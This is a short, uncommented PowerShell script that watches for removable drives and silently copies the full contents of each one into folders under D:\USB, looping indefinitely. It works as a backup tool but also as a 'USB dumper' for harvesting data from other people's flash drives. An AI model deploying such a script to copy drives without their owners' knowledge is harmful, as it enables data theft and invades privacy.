mkdir "D:\USB"
Set-Location "D:\USB"
while ($true){
    if ((get-volume | where-Object {$_.drivetype -eq "removable"}).DriveLetter -ne $null) {
        $Driveletters = (get-volume | where-Object {$_.drivetype -eq "removable"}).DriveLetter
        $i=0
        foreach ($drive in $Driveletters) {
            $DrivePath = (get-psdrive | where-object {$_.Name -eq $DriveLetters[$i]}).Root
            $Label = (get-volume | where-object {$_.DriveLetter -eq $DriveLetters[$i]}).FileSystemLabel
            mkdir $Label
            Robocopy.exe $DrivePath $Label /E  
            $i++
        }$i=0
        Start-Sleep -Seconds 10
    }
    else {
        Start-Sleep -Seconds 5
    }
}
